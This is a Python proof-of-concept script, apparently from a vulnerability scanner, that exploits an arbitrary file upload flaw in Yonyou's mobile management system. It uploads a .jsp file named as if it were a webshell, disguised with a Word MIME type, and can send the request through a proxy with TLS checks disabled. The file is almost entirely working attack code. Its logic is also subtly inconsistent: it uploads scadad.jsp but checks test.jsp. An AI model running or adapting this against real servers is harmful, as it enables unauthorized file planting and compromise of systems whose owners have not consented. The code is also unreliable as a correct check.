import requests
import re
from bs4 import BeautifulSoup
import logging

uia=''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie=None):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Cookie": "JSESSIONID=611881C7A894042DC70DE73B41107CF6"
        }
        webshell = "wbvuibsvdlzvnddadv"
        files = {
            "downloadpath": ("scadad.jsp", f"{webshell}", "application/msword")
        }
        logging.captureWarnings(True)
        gf = requests.post(url + "maportal/appmanager/uploadApk.dopk_obj=",files=files,cookies=s_cookie, headers=headers,proxies=proxies, verify=False)
        gf.encoding = 'utf-8'
        if '{"status":2}' in gf.text:
            headers2={'Cache-Control': 'max-age=0',
                      'Upgrade-Insecure-Requests':'1',
                      'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36',
                      'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                      'Accept-Encoding':'gzip, deflate',
                      'Cookie': 'JSESSIONID=AAC37658EE256C5B82F85CCB3F27EE0E.server; JSESSIONID=68D8CD7BD870BF0CCC6FBAA9614D80F0.server'}
            gf1 = requests.get(url + "maupload/apk/test.jsp",cookies=s_cookie, headers=headers2,proxies=proxies, verify=False)
            if 'wbvuibsvdlzvnddadv' in gf1.text:
                uia = '[+]漏洞存在\n/maupload/apk/scadad.jsp\n'+str(gf1.text)
            else:
                uia = "[-]漏洞不存在"
        else:
            uia = "[-]漏洞不存在"
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
def yt1():
    global uia
    return '--------------------------------------------------\n[ 用友移动管理系统uploadApk.do任意文件上传漏洞 ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)